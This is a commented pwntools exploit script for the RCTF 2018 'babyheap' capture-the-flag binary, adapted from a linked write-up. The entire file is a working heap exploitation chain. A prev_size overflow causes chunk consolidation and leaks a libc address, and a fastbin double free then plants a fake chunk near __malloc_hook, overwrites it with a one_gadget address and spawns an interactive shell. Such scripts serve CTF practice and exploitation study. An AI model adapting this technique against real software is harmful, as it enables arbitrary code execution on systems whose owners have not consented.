#This exploit is based off of: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/

#Import pwntools
from pwn import *

#Establish the three functions needed to interface with the target
def alloc(size, content):
	target.recvuntil("choice: ")
	target.sendline('1')
	target.recvuntil("please input chunk size: ")
	target.sendline(str(size))
	target.recvuntil("input chunk content: ")
	target.sendline(content)

def show(index):
	target.recvuntil("choice: ")
	target.sendline('2')
	target.recvuntil("please input chunk index: ")	
	target.sendline(str(index))

def delete(index):
	target.recvuntil("choice: ")
	target.sendline('3')
	target.recvuntil("please input chunk index: ")
	target.sendline(str(index))

#Establish the target, enviornment, and the libc file associated
target = process('./babyheap', env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF('./libc.so.6')
gdb.attach(target)

#Allocate the first four chunks
alloc(0xf0, '0'*0xf0)# Chunk 0
alloc(0x70, '1'*0x70)# Chunk 1
alloc(0xf0, '2'*0xf0)# Chunk 2
alloc(0x30, '3'*0x30)# Chunk3

#Free the first two chunks to setup for the overflow and chunk consolidation
delete(0)# Chunk 0 is now freed
delete(1)# Chunk 1 is now freed

#Allocate a new chunk where chunk 1 used to be, to overflow chunk 2's prev_size with 0x180 and prev in use bit to 0x0 to allow for the chunk consolidation
alloc(0x78, '4'*0x70 + p64(0x180))# Chunk 0

#Free chunk 2, which will consolidate with chunk 0, thus start allocating space before chunk 0 and allowing us to overflow it
delete(2)

#allocate space to push a libc address into the content section for Chunk 0
alloc(0xf0, '5'*0xf0)# Chunk 1

#Print the contents of chunk 0, which will leak a libc address. Filter it out and calculate the other addresses needed
show(0)
print target.recvuntil("content: ")
leak = u64(target.recv(6) + "\x00\x00")
libc = leak - elf.symbols['__malloc_hook'] - 0x68
fake_chunk = libc + elf.symbols['__malloc_hook'] - 0x23
oneshot = libc + 0x4526a
log.info("Leak is:   " + hex(leak))
log.info("Libc is:   " + hex(libc))
log.info("Chunk is:  " + hex(fake_chunk))
log.info("System is: " + hex(oneshot))

#Free chunk 1 to make space fot he new chunks
delete(1)

#Allocate the other chunks to be freed, which will lead to the double free
alloc(0x10, '6'*0x10)# Chunk 1
alloc(0x60, '7'*0x60)# Chunk 1
alloc(0x60, '8'*0x60)# Chunk 4
alloc(0x60, '9'*0x60)# Chunk 5, directly overlaps with Chunk 0

#Free chunks 5, 4, and 0, to free the same address (5 & 0) twice
delete(5)
delete(4)
delete(0)


#Allocate three spaces and get our fake chunk added to the list of free chunks 
alloc(0x60, p64(fake_chunk) + p64(0) + 'w'*0x50)
alloc(0x60, 'x'*0x60)
alloc(0x60, 'y'*0x60)

#Allocate new space to write over the malloc hook
alloc(0x60, 'z'*0x13 + p64(oneshot) + "\n")

#Just have the code call calloc again to get rce
target.sendlineafter("choice: ", "1")
target.sendlineafter(": ", "1")

#Drop to an interactive shell to use the shell
target.interactive()

#This exploit is based off of: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/